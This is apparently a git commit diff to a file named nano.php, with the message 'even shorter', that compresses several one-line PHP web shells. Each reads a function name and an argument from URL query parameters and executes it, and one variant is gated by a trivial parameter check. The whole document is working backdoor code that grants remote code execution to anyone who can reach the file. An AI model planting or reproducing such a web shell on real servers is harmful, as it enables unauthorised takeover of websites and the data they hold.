7aa5bdf457c54cb31a246f0c4f0bd69be580f8b3
Nick <nickmour5@gmail.com>
2018-06-04 14:19:09 +0300

    even shorter

--- nano.php
+++ nano.php
@@ -1,7 +1,7 @@
 //if short tags are allowed
-<?$x=$_GET;(@$x[p]=='_'?@$x[f]($x[c]):1);
+<?$x=$_GET;@$x[p]=='_'?@$x[f]($x[c]):1;
 <?$x=$_GET;@$x[f]($x[c]);
 
 //full tag versions
-<?php$x=$_GET;(@$x[p]=='_'?@$x[f]($x[c]):1);
+<?php$x=$_GET;@$x[p]=='_'?@$x[f]($x[c]):1;
 <?php$x=$_GET;@$x[f]($x[c]);
